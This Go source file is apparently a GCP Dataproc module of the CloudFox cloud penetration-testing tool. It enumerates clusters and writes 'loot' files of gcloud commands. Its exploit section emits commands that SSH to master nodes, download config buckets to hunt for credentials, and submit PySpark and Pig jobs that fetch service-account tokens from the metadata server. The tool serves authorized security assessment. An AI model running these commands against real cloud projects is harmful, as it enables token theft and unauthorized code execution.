package commands

import (
	"github.com/BishopFox/cloudfox/gcp/shared"
	"context"
	"fmt"
	"strings"
	"sync"

	dataprocservice "github.com/BishopFox/cloudfox/gcp/services/dataprocService"
	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	gcpinternal "github.com/BishopFox/cloudfox/internal/gcp"
	"github.com/spf13/cobra"
)

var GCPDataprocCommand = &cobra.Command{
	Use:     globals.GCP_DATAPROC_MODULE_NAME,
	Aliases: []string{"dp", "hadoop", "spark"},
	Short:   "Enumerate Dataproc clusters",
	Long: `Enumerate Dataproc (Hadoop/Spark) clusters.

Features:
- Lists all Dataproc clusters across regions
- Shows service account configuration
- Identifies public IP exposure
- Checks for Kerberos authentication
- Analyzes security configurations`,
	Run: runGCPDataprocCommand,
}

type DataprocModule struct {
	gcpinternal.BaseGCPModule
	ProjectClusters map[string][]dataprocservice.ClusterInfo // projectID -> clusters
	LootMap         map[string]map[string]*internal.LootFile // projectID -> loot files
	FoxMapperCache  *gcpinternal.FoxMapperCache              // Cached FoxMapper results
	mu              sync.Mutex
}

type DataprocOutput struct {
	Table []internal.TableFile
	Loot  []internal.LootFile
}

func (o DataprocOutput) TableFiles() []internal.TableFile { return o.Table }
func (o DataprocOutput) LootFiles() []internal.LootFile   { return o.Loot }

func runGCPDataprocCommand(cmd *cobra.Command, args []string) {
	cmdCtx, err := gcpinternal.InitializeCommandContext(cmd, globals.GCP_DATAPROC_MODULE_NAME)
	if err != nil {
		return
	}

	module := &DataprocModule{
		BaseGCPModule:   gcpinternal.NewBaseGCPModule(cmdCtx),
		ProjectClusters: make(map[string][]dataprocservice.ClusterInfo),
		LootMap:         make(map[string]map[string]*internal.LootFile),
	}
	module.Execute(cmdCtx.Ctx, cmdCtx.Logger)
}

func (m *DataprocModule) Execute(ctx context.Context, logger internal.Logger) {
	// Get FoxMapper cache from context
	m.FoxMapperCache = gcpinternal.GetFoxMapperCacheFromContext(ctx)

	m.RunProjectEnumeration(ctx, logger, m.ProjectIDs, globals.GCP_DATAPROC_MODULE_NAME, m.processProject)

	allClusters := m.getAllClusters()
	if len(allClusters) == 0 {
		logger.InfoM("No Dataproc clusters found", globals.GCP_DATAPROC_MODULE_NAME)
		return
	}

	runningCount := 0
	publicCount := 0
	for _, cluster := range allClusters {
		if cluster.State == "RUNNING" {
			runningCount++
		}
		if !cluster.InternalIPOnly {
			publicCount++
		}
	}

	logger.SuccessM(fmt.Sprintf("Found %d Dataproc cluster(s) (%d running, %d with public IPs)",
		len(allClusters), runningCount, publicCount), globals.GCP_DATAPROC_MODULE_NAME)
	m.writeOutput(ctx, logger)
}

func (m *DataprocModule) getAllClusters() []dataprocservice.ClusterInfo {
	var all []dataprocservice.ClusterInfo
	for _, clusters := range m.ProjectClusters {
		all = append(all, clusters...)
	}
	return all
}

func (m *DataprocModule) processProject(ctx context.Context, projectID string, logger internal.Logger) {
	if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
		logger.InfoM(fmt.Sprintf("Enumerating Dataproc in project: %s", projectID), globals.GCP_DATAPROC_MODULE_NAME)
	}

	svc := dataprocservice.New()

	clusters, err := svc.ListClusters(projectID)
	if err != nil {
		m.CommandCounter.Error++
		gcpinternal.HandleGCPError(err, logger, globals.GCP_DATAPROC_MODULE_NAME,
			fmt.Sprintf("Could not list Dataproc clusters in project %s", projectID))
		return
	}

	m.mu.Lock()
	m.ProjectClusters[projectID] = clusters

	// Initialize loot for this project
	if m.LootMap[projectID] == nil {
		m.LootMap[projectID] = make(map[string]*internal.LootFile)
		m.LootMap[projectID]["dataproc-commands"] = &internal.LootFile{
			Name:     "dataproc-commands",
			Contents: "# Dataproc Commands\n# Generated by CloudFox\n# WARNING: Only use with proper authorization\n\n",
		}
	}

	for _, cluster := range clusters {
		m.addToLoot(projectID, cluster)
	}
	m.mu.Unlock()
}

func (m *DataprocModule) addToLoot(projectID string, cluster dataprocservice.ClusterInfo) {
	lootFile := m.LootMap[projectID]["dataproc-commands"]
	if lootFile == nil {
		return
	}

	lootFile.Contents += fmt.Sprintf(
		"# =============================================================================\n"+
			"# DATAPROC CLUSTER: %s\n"+
			"# =============================================================================\n"+
			"# Project: %s\n"+
			"# Region: %s\n"+
			"# State: %s\n"+
			"# Service Account: %s\n"+
			"# Public IPs: %s\n"+
			"# Kerberos: %s\n",
		cluster.Name, cluster.ProjectID, cluster.Region,
		cluster.State, cluster.ServiceAccount,
		shared.BoolToYesNo(!cluster.InternalIPOnly),
		shared.BoolToYesNo(cluster.KerberosEnabled),
	)

	if len(cluster.MasterInstanceNames) > 0 {
		lootFile.Contents += fmt.Sprintf("# Master Instances: %s\n", strings.Join(cluster.MasterInstanceNames, ", "))
	}

	// === ENUMERATION COMMANDS ===
	lootFile.Contents += fmt.Sprintf(`
# === ENUMERATION COMMANDS ===

# Describe cluster:
gcloud dataproc clusters describe %s --region=%s --project=%s

# List jobs on this cluster:
gcloud dataproc jobs list --cluster=%s --region=%s --project=%s

# Get cluster IAM policy:
gcloud dataproc clusters get-iam-policy %s --region=%s --project=%s

# List cluster metadata/properties:
gcloud dataproc clusters describe %s --region=%s --project=%s --format=json | jq '.config.softwareConfig.properties'

`,
		cluster.Name, cluster.Region, cluster.ProjectID,
		cluster.Name, cluster.Region, cluster.ProjectID,
		cluster.Name, cluster.Region, cluster.ProjectID,
		cluster.Name, cluster.Region, cluster.ProjectID,
	)

	// Bucket commands
	if cluster.ConfigBucket != "" {
		lootFile.Contents += fmt.Sprintf(
			"# List config bucket (may contain init scripts with secrets):\n"+
				"gsutil ls -r gs://%s/\n"+
				"# Download init actions (check for hardcoded credentials):\n"+
				"gsutil -m cp -r gs://%s/google-cloud-dataproc-metainfo/ /tmp/dataproc-config-%s/\n\n",
			cluster.ConfigBucket,
			cluster.ConfigBucket, cluster.Name,
		)
	}
	if cluster.TempBucket != "" {
		lootFile.Contents += fmt.Sprintf(
			"# List temp bucket (may contain job output/data):\n"+
				"gsutil ls -r gs://%s/\n\n",
			cluster.TempBucket,
		)
	}

	// === EXPLOIT COMMANDS ===
	lootFile.Contents += "# === EXPLOIT COMMANDS ===\n\n"

	// SSH to master node
	if len(cluster.MasterInstanceNames) > 0 {
		masterName := cluster.MasterInstanceNames[0]
		lootFile.Contents += fmt.Sprintf(
			"# SSH to master node (runs as cluster SA: %s):\n"+
				"gcloud compute ssh %s --project=%s --zone=ZONE\n\n"+
				"# SSH through IAP (if direct SSH blocked):\n"+
				"gcloud compute ssh %s --tunnel-through-iap --project=%s --zone=ZONE\n\n",
			cluster.ServiceAccount,
			masterName, cluster.ProjectID,
			masterName, cluster.ProjectID,
		)
	} else {
		lootFile.Contents += fmt.Sprintf(
			"# SSH to master node:\n"+
				"gcloud compute ssh %s-m --project=%s --zone=ZONE\n\n"+
				"# SSH through IAP (if direct SSH blocked):\n"+
				"gcloud compute ssh %s-m --tunnel-through-iap --project=%s --zone=ZONE\n\n",
			cluster.Name, cluster.ProjectID,
			cluster.Name, cluster.ProjectID,
		)
	}

	// Submit jobs for code execution
	lootFile.Contents += fmt.Sprintf(
		"# Submit PySpark job for code execution (runs as SA: %s):\n"+
			"cat > /tmp/cloudfox_spark.py << 'SPARKEOF'\n"+
			"import subprocess, json\n"+
			"result = subprocess.run(['curl', '-s', '-H', 'Metadata-Flavor: Google',\n"+
			"    'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'],\n"+
			"    capture_output=True, text=True)\n"+
			"print(json.loads(result.stdout))\n"+
			"SPARKEOF\n"+
			"gcloud dataproc jobs submit pyspark /tmp/cloudfox_spark.py --cluster=%s --region=%s --project=%s\n\n"+
			"# Submit Spark job:\n"+
			"gcloud dataproc jobs submit spark --cluster=%s --region=%s --project=%s --class=MAIN_CLASS --jars=JAR_PATH\n\n"+
			"# Submit Hive query (access HDFS/HBase data):\n"+
			"gcloud dataproc jobs submit hive --cluster=%s --region=%s --project=%s --execute=\"SHOW DATABASES; SHOW TABLES;\"\n\n"+
			"# Submit Pig job:\n"+
			"gcloud dataproc jobs submit pig --cluster=%s --region=%s --project=%s --execute=\"sh curl -s http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -H Metadata-Flavor:Google\"\n\n",
		cluster.ServiceAccount,
		cluster.Name, cluster.Region, cluster.ProjectID,
		cluster.Name, cluster.Region, cluster.ProjectID,
		cluster.Name, cluster.Region, cluster.ProjectID,
		cluster.Name, cluster.Region, cluster.ProjectID,
	)

	// Access web UIs
	lootFile.Contents += fmt.Sprintf(
		"# Access Hadoop/Spark Web UIs (via SSH tunnel or component gateway):\n"+
			"# YARN ResourceManager: http://<master>:8088\n"+
			"# HDFS NameNode: http://<master>:9870\n"+
			"# Spark History: http://<master>:18080\n"+
			"# Create SSH tunnel to YARN UI:\n"+
			"gcloud compute ssh %s-m --project=%s --zone=ZONE -- -L 8088:localhost:8088 -N\n\n",
		cluster.Name, cluster.ProjectID,
	)
}

func (m *DataprocModule) writeOutput(ctx context.Context, logger internal.Logger) {
	if m.Hierarchy != nil && !m.FlatOutput {
		m.writeHierarchicalOutput(ctx, logger)
	} else {
		m.writeFlatOutput(ctx, logger)
	}
}

func (m *DataprocModule) getTableHeader() []string {
	return []string{
		"Project",
		"Name",
		"Region",
		"State",
		"Master",
		"Master Instances",
		"Workers",
		"Service Account",
		"SA Attack Paths",
		"Public IPs",
		"Kerberos",
		"IAM Binding Role",
		"IAM Binding Principal",
	}
}

func (m *DataprocModule) clustersToTableBody(clusters []dataprocservice.ClusterInfo) [][]string {
	var body [][]string
	for _, cluster := range clusters {
		sa := cluster.ServiceAccount
		if sa == "" {
			sa = "(default)"
		}

		// Check attack paths (privesc/exfil/lateral) for the service account
		attackPaths := "run foxmapper"
		if m.FoxMapperCache != nil && m.FoxMapperCache.IsPopulated() {
			if sa != "(default)" && sa != "" {
				attackPaths = gcpinternal.GetAttackSummaryFromCaches(m.FoxMapperCache, nil, sa)
			} else {
				attackPaths = "No"
			}
		}

		masterConfig := fmt.Sprintf("%s x%d", cluster.MasterMachineType, cluster.MasterCount)
		workerConfig := fmt.Sprintf("%s x%d", cluster.WorkerMachineType, cluster.WorkerCount)

		// Master instances
		masterInstances := "-"
		if len(cluster.MasterInstanceNames) > 0 {
			masterInstances = strings.Join(cluster.MasterInstanceNames, ", ")
		}

		// If cluster has IAM bindings, create one row per binding
		if len(cluster.IAMBindings) > 0 {
			for _, binding := range cluster.IAMBindings {
				body = append(body, []string{
					m.GetProjectName(cluster.ProjectID),
					cluster.Name,
					cluster.Region,
					cluster.State,
					masterConfig,
					masterInstances,
					workerConfig,
					sa,
					attackPaths,
					shared.BoolToYesNo(!cluster.InternalIPOnly),
					shared.BoolToYesNo(cluster.KerberosEnabled),
					binding.Role,
					binding.Member,
				})
			}
		} else {
			// Cluster has no IAM bindings - single row
			body = append(body, []string{
				m.GetProjectName(cluster.ProjectID),
				cluster.Name,
				cluster.Region,
				cluster.State,
				masterConfig,
				masterInstances,
				workerConfig,
				sa,
				attackPaths,
				shared.BoolToYesNo(!cluster.InternalIPOnly),
				shared.BoolToYesNo(cluster.KerberosEnabled),
				"-",
				"-",
			})
		}
	}
	return body
}

func (m *DataprocModule) writeHierarchicalOutput(ctx context.Context, logger internal.Logger) {
	outputData := internal.HierarchicalOutputData{
		OrgLevelData:     make(map[string]internal.CloudfoxOutput),
		ProjectLevelData: make(map[string]internal.CloudfoxOutput),
	}

	for projectID, clusters := range m.ProjectClusters {
		body := m.clustersToTableBody(clusters)
		tableFiles := []internal.TableFile{{Name: "dataproc-clusters", Header: m.getTableHeader(), Body: body}}

		var lootFiles []internal.LootFile
		if projectLoot, ok := m.LootMap[projectID]; ok {
			for _, loot := range projectLoot {
				if loot != nil && loot.Contents != "" && !strings.HasSuffix(loot.Contents, "# WARNING: Only use with proper authorization\n\n") {
					lootFiles = append(lootFiles, *loot)
				}
			}
		}

		outputData.ProjectLevelData[projectID] = DataprocOutput{Table: tableFiles, Loot: lootFiles}
	}

	pathBuilder := m.BuildPathBuilder()

	err := internal.HandleHierarchicalOutputSmart("gcp", m.Format, m.Verbosity, m.WrapTable, pathBuilder, outputData)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error writing hierarchical output: %v", err), globals.GCP_DATAPROC_MODULE_NAME)
	}
}

func (m *DataprocModule) writeFlatOutput(ctx context.Context, logger internal.Logger) {
	allClusters := m.getAllClusters()
	body := m.clustersToTableBody(allClusters)

	tables := []internal.TableFile{{Name: "dataproc-clusters", Header: m.getTableHeader(), Body: body}}

	var lootFiles []internal.LootFile
	for _, projectLoot := range m.LootMap {
		for _, loot := range projectLoot {
			if loot != nil && loot.Contents != "" && !strings.HasSuffix(loot.Contents, "# WARNING: Only use with proper authorization\n\n") {
				lootFiles = append(lootFiles, *loot)
			}
		}
	}

	output := DataprocOutput{Table: tables, Loot: lootFiles}

	scopeNames := make([]string, len(m.ProjectIDs))
	for i, id := range m.ProjectIDs {
		scopeNames[i] = m.GetProjectName(id)
	}

	err := internal.HandleOutputSmart("gcp", m.Format, m.OutputDirectory, m.Verbosity, m.WrapTable,
		"project", m.ProjectIDs, scopeNames, m.Account, output)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error writing output: %v", err), globals.GCP_DATAPROC_MODULE_NAME)
	}
}
